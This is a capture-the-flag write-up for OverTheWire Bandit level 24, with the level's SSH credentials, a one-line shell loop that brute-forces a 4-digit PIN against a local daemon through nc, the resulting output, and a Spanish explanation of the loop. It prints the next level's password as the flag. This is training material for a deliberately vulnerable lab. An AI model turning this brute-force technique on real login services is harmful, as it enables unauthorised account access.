# Level-24 -> Level-25

### Level Goat
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time
### Credentials
ssh bandit24@bandit.labs.overthewire.org -p 2220
password: **VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar**
### Solution
```shell
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
.
.
.
.
.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:~$ 

```
### Summary
El comando `for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done` genera una lista de cadenas que comienzan con “VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar” y terminan con un número de cuatro dígitos del 0000 al 9999.

El comando `do` es una palabra clave que se utiliza en combinación con el comando `for` en Linux. En este caso, el comando `do` se utiliza para indicar el inicio del bloque de código que se ejecutará en cada iteración del bucle `for`.

El bucle `for` se ejecutará 10,000 veces. En cada iteración del bucle, se imprimirá una cadena que comienza con “VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar” y termina con un número de cuatro dígitos del 0000 al 9999.

Cada cadena generada se imprime en la salida estándar. En este caso, la salida se mostrará en la terminal o consola donde se ejecuta el comando.
### FLAG
**p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d** 